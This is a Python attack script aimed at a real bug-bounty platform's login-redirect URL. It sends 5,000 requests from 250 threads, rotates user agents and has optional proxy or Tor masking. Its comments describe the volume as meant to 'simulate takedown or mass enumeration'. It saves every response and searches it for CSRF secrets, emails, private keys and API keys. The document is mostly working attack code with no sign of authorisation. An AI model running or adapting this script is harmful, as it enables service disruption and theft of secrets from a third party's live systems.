# Bad-medicine

```python
import requests
import threading
import random
import json
import time
import csv
import os
import re
from queue import Queue

# ----- CONFIG -----
target_url = "https://bugs.immunefi.com/?redirect_to=%2Fdashboard%2Fsubmission%2F"
num_threads = 250           # Higher concurrency for stress
num_requests = 5000         # More requests to simulate takedown or mass enumeration
proxies_list = [
    # Example: "http://127.0.0.1:9050"
]
output_csv = "immunefi_poc_log.csv"
output_dir = "responses_html"
use_proxies = False
# -------------------

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
]

if not os.path.exists(output_dir):
    os.makedirs(output_dir)

if not os.path.exists(output_csv):
    with open(output_csv, mode="w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow([
            "Request#", "Status", "URL", "Latency", "Content-Length", 
            "Redirected", "Proxy", "Headers JSON", "HTML Filename", "Suspicious Data Found"
        ])

queue = Queue()
for i in range(num_requests):
    queue.put(i + 1)

def generate_random_suffix():
    return f"{random.randint(10000, 99999):05d}"

def check_sensitive_data(content):
    # Check if dashboard or sensitive info appears
    patterns = [
        r"csrfsecret",
        r"csrfpreservesecret",
        r"user_email",
        r"dashboard",
        r"private_key",
        r"api_key",
        r"walletconnect"
    ]
    for pattern in patterns:
        if re.search(pattern, content, re.IGNORECASE):
            return True
    return False

def worker():
    while not queue.empty():
        req_num = queue.get()
        random_suffix = generate_random_suffix()
        final_url = f"{target_url}&rand={random_suffix}"

        headers = {
            "User-Agent": random.choice(user_agents),
        }

        proxy_dict = None
        proxy_str = "None"

        if use_proxies and proxies_list:
            proxy = random.choice(proxies_list)
            proxy_dict = {
                "http": proxy,
                "https": proxy,
            }
            proxy_str = proxy

        start = time.time()

        try:
            resp = requests.get(final_url, headers=headers, proxies=proxy_dict, allow_redirects=True, timeout=1)
            latency = round(time.time() - start, 3)
            content_length = len(resp.content)
            redirected = "Yes" if resp.history else "No"

            html_filename = f"response_{random_suffix}.html"
            html_path = os.path.join(output_dir, html_filename)
            with open(html_path, "wb") as html_file:
                html_file.write(resp.content)

            headers_json = json.dumps(dict(resp.headers))

            suspicious = "No"
            if check_sensitive_data(resp.text):
                suspicious = "Yes"
                print(f"⚠️ [#{req_num}] Possible sensitive data found!")

            print(f"[#{req_num}] Status: {resp.status_code}, Lat: {latency}s, Len: {content_length}, Suspicious: {suspicious}, File: {html_filename}")

            with open(output_csv, mode="a", newline="", encoding="utf-8") as f:
                writer = csv.writer(f)
                writer.writerow([
                    req_num, resp.status_code, final_url, latency, 
                    content_length, redirected, proxy_str, headers_json, 
                    html_filename, suspicious
                ])

        except Exception as e:
            print(f"[#{req_num}] ERROR: {e}")

        queue.task_done()

threads = []
for _ in range(num_threads):
    t = threading.Thread(target=worker)
    t.daemon = True
    threads.append(t)
    t.start()

queue.join()
print("✅ All requests completed. Logs and HTML saved.")
```
